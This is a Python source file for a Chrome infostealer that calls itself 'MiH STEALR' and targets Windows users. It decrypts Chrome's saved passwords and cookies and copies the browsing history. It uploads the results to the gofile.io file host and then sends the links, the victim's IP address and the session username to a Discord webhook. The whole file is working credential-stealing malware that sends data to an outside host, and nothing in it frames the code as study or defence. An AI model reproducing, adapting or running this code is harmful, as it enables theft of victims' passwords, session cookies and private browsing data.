import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import requests
import zipfile
import os
import shutil

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def extract_chrome_history(output_file="chrome_history.txt"):
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "History")
    temp_db_path = "temp_history_copy"

    shutil.copy2(db_path, temp_db_path)

    connection = sqlite3.connect(temp_db_path)
    cursor = connection.cursor()

    query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
    cursor.execute(query)
    history_entries = cursor.fetchall()

    connection.close()

    with open(output_file, "w", encoding="utf-8") as file:
        file.write("___  ___  ___ ______ _____   _____ _   _   _   _  _____  ___  _   _ _____ _   _\n")
        file.write("|  \\/  | / _ \\|  _  \\  ___| |_   _| \\ | | | | | ||  ___|/ _ \\| | | |  ___| \\ | |\n")
        file.write("| .  . |/ /_\\ \\ | | | |__     | | |  \\| | | |_| || |__ / /_\\ \\ | | | |__ |  \\| |\n")
        file.write("| |\\/| ||  _  | | | |  __|    | | | . ` | |  _  ||  __||  _  | | | |  __|| . ` |\n")
        file.write("| |  | || | | | |/ /| |___   _| |_| |\\  | | | | || |___| | | \\ \\_/ / |___| |\\  |\n")
        file.write("\\_|  |_/\\_| |_/___/ \\____/   \\___/\\_| \\_/ \\_| |_/\____/\\_| |_/\\___/\\____/\\_| \\_/\n")
        file.write("\n")

        file.write("URL, Titre, Dernière visite\n")
        for entry in history_entries:
            file.write(f"{entry[0]}, {entry[1]}, {entry[2]}\n")

def upload_to_anonfiles(path):
    try:
        server_url = f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile'
        return requests.post(server_url, files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:
        return False
def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    with open('decrypted_passwords.txt', 'w', encoding='utf-8') as output_file:
        output_file.write("___  ___          _        _         _   _\n")
        output_file.write("|  \\/  |         | |      (_)       | | | |\n")
        output_file.write("| .  . | __ _  __| | ___   _ _ __   | |_| | ___  __ ___   _____ _ __\n")
        output_file.write("| |\\/| |/ _` |/ _` |/ _ \\ | | '_ \  |  _  |/ _ \\/ _` \\ \\ / / _ \\ '_ \n")
        output_file.write("| |  | | (_| | (_| |  __/ | | | | | | | | |  __/ (_| |\\ V /  __/ | | |\n")
        output_file.write("\\_|  |_/\\__,_|\\__,_|\\___| |_|_| |_| \\_| |_|\\___|\\__,_| \\_/ \\___|_| |_|\n")
        output_file.write("\n")

        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                output_file.write(f"Origin URL: {origin_url}\n")
                output_file.write(f"Action URL: {action_url}\n")
                output_file.write(f"Username: {username}\n")
                output_file.write(f"Password: {password}\n")
            else:
                continue

            if date_created != 86400000000 and date_created:
                output_file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                output_file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            output_file.write("="*50 + "\n")

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
def extract_chrome_cookies(output_file="chrome_cookies.txt"):
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    temp_db_path = "temp_cookies_copy"

    shutil.copy2(db_path, temp_db_path)

    connection = sqlite3.connect(temp_db_path)
    cursor = connection.cursor()

    query = """
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies"""
    cursor.execute(query)
    cookies_entries = cursor.fetchall()

    connection.close()

    with open(output_file, "w", encoding="utf-8") as file:
        file.write("___  ___  ___ ______ _____   _____ _   _   _   _  _____  ___  _   _ _____ _   _\n")
        file.write("|  \\/  | / _ \\|  _  \\  ___| |_   _| \\ | | | | | ||  ___|/ _ \\| | | |  ___| \\ | |\n")
        file.write("| .  . |/ /_\\ \\ | | | |__     | | |  \\| | | |_| || |__ / /_\\ \\ | | | |__ |  \\| |\n")
        file.write("| |\\/| ||  _  | | | |  __|    | | | . ` | |  _  ||  __||  _  | | | |  __|| . ` |\n")
        file.write("| |  | || | | | |/ /| |___   _| |_| |\\  | | | | || |___| | | \\ \\_/ / |___| |\\  |\n")
        file.write("\\_|  |_/\\_| |_/___/ \\____/   \\___/\\_| \\_/ \\_| |_/\____/\\_| |_/\\___/\\____/\\_| \\_/\n")
        file.write("\n")

        file.write("Host, Cookie name, Cookie value (decrypted), Creation datetime (UTC), Last access datetime (UTC), Expires datetime (UTC)\n")
        for entry in cookies_entries:
            host_key = entry[0]
            name = entry[1]
            encrypted_value = entry[6]
            decrypted_value = decrypt_password(encrypted_value, key)
            creation_utc = get_chrome_datetime(entry[3])
            last_access_utc = get_chrome_datetime(entry[4])
            expires_utc = get_chrome_datetime(entry[5])

            file.write(f"{host_key}, {name}, {decrypted_value}, {creation_utc}, {last_access_utc}, {expires_utc}\n")

    with zipfile.ZipFile('decrypted_passwords.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write('decrypted_passwords.txt')

    username = os.getenv("USERNAME")
    pass_link = upload_to_anonfiles('decrypted_passwords.zip')
    history_link = upload_to_anonfiles('chrome_history.txt')
    cookies_link = upload_to_anonfiles('chrome_cookies.txt')

    if pass_link:
        webhook_url = ''
        ip_address = requests.get("https://api.ipify.org/").text

        embeds = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1168866780941389934/1172967173916999810/ab67616d0000b273f9ae145ca74784398c3b6c9b.png?ex=65623dce&is=654fc8ce&hm=5846dec8fdea603dd3f7aea0f55fd46819636029b0f9f6daf87715b0f27189e2&",
            "username": "MiH STEALR",
            "content": "@here",
            "embeds": [
                {
                    "title": "YOU'VE REACHED HEAVEN !",
                    "fields": [
                        {"name": "Victim's IP :", "value": f"```{ip_address}```", "inline": True},
                        {"name": "Session user :", "value": f"```{username}```", "inline": True}
                    ]
                },
                {
                    "title": "Credentials",
                    "fields": [
                        {"name": ":key: Retrieved passwords :", "value": f"```{pass_link}```", "inline": True}
                    ]
                },
                {
                    "title": "Credentials",
                    "fields": [
                        {"name": ":globe_with_meridians: Chrome History :", "value": f"```{history_link}```", "inline": True},
                        {"name": ":cookie: Cookies :", "value": f"```{cookies_link}```", "inline": True}
                    ]
                }
            ]
        }

        response = requests.post(webhook_url, json=embeds)

if __name__ == "__main__":
    extract_chrome_history()
    main()
